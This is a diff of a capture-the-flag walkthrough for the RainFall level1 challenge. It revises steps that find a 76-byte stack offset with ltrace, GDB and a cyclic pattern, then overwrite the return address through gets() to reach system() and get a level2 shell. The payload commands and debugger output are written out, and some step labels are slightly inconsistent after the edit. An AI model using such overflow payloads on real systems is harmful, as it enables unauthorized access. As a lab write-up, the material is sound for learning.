@@ -37,87 +37,7 @@ Segmentation fault (core dumped)
 
 ---
 
-## Step 2: Investigate with `ltrace`
-
-```bash
-level1@RainFall:~$ ltrace ./level1
-gets(0xbffff720, 47, ...) = 0xbffff720
---- SIGSEGV (Segmentation fault) ---
-```
-
-> The program uses `gets()`, which **does not check buffer lengths**, confirming a buffer overflow vulnerability.
-
----
-
-## Step 3: Determine Offset
-
-To exploit the overflow, we need to find the exact offset to overwrite the return address. Start by creating input of increasing lengths:
-
-```bash
-python -c 'print "a" * 20' > /tmp/test
-./level1 < /tmp/test
-python -c 'print "a" * 40' > /tmp/test
-./level1 < /tmp/test
-python -c 'print "a" * 60' > /tmp/test
-./level1 < /tmp/test
-python -c 'print "a" * 80' > /tmp/test
-./level1 < /tmp/test
-Segmentation fault (core dumped)
-```
-
-* The crash occurs around 80 bytes → the **return address is likely near the 72-76th byte**.
-
----
-
-## Step 3.1: Find the Offset with GDB
-
-You can use GDB to precisely determine the offset needed to overwrite the return address:
-
-1. Start GDB:
-    ```bash
-    gdb ./level1
-    ```
-
-2. Set a breakpoint at `main` and run with a large input:
-    ```bash
-    (gdb) b main
-    (gdb) r < <(python -c 'print("A"*100)')
-    ```
-
-3. When the program crashes, check the stack pointer:
-    ```bash
-    (gdb) info registers esp
-    ```
-
-4. Examine the stack near the crash:
-    ```bash
-    (gdb) x/40x $esp
-    ```
-
-5. Look for the sequence of `0x41` (ASCII 'A') and note where it ends—this is where your input overwrites the return address.
-
-6. Adjust your input length and repeat until you see the return address replaced by `0x41414141`.
-
-> This confirms the exact offset needed to control the return address.
-
----
-
-## Step 4: Analyze in GDB
-
-```bash
-gdb ./level1
-(gdb) b main
-(gdb) r < /tmp/test
-```
-
-Step through the program with `ni` (next instruction) until the crash:
-
-* You will notice the return address is overwritten.
-* The `run` function eventually calls `system()`.
-
----
-
-## Step 5: Find the `system()` Address
+## Step 2: Analyze in GDB
 
 List functions:
 
@@ -130,20 +50,43 @@ List functions:
 
 > We will attempt to overwrite the return address to jump to `system()`.
 
+After analyzing run we can see a call to system(). Let's try to redirect our program to run.
+
 ---
 
-## Step 6: Craft Exploit
-
-First attempt (incorrect offset):
+## Step 3: Investigate with `ltrace`
 
 ```bash
-python -c 'print "a" * 72 + "\x44\x84\x04\x08"' > /tmp/test
-./level1 < /tmp/test
-Illegal instruction (core dumped)
+level1@RainFall:~$ ltrace ./level1
+gets(0xbffff720, 47, ...) = 0xbffff720
+--- SIGSEGV (Segmentation fault) ---
 ```
 
-* The offset was slightly off.
-* Adjusting by 4 bytes:
+> The program uses `gets()`, which **does not check buffer lengths**, confirming a buffer overflow vulnerability.
+
+---
+
+## Step 4: Determine Offset
+
+To exploit the overflow, we need to find the exact offset to overwrite the return address.
+
+```bash
+python -c 'print "Aa0Aa1Aa2Aa3Aa..."' > /tmp/ovcycle
+gdb ./level1
+(gdb) r < /tmp/ovcycle
+Starting program: /home/user/level1/level1 < /tmp/lv2
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+```
+
+> 0x63413563 corresponds to an offset of 76 in the given pattern
+
+---
+
+## Step 5: Craft Exploit
+
+First attempt (incorrect offset):
 
 ```bash
 python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/test
@@ -155,7 +98,7 @@ Good... Wait what?
 
 ---
 
-## Step 7: Escalate to `level2`
+## Step 6: Escalate to `level2`
 
 Interact with the program:
 
@@ -177,7 +120,7 @@ exit
 
 ---
 
-## Step 8: Summary
+## Step 7: Summary
 
 * **Vulnerability:** `gets()` allows a buffer overflow.
 * **Offset:** 76 bytes to the return address.
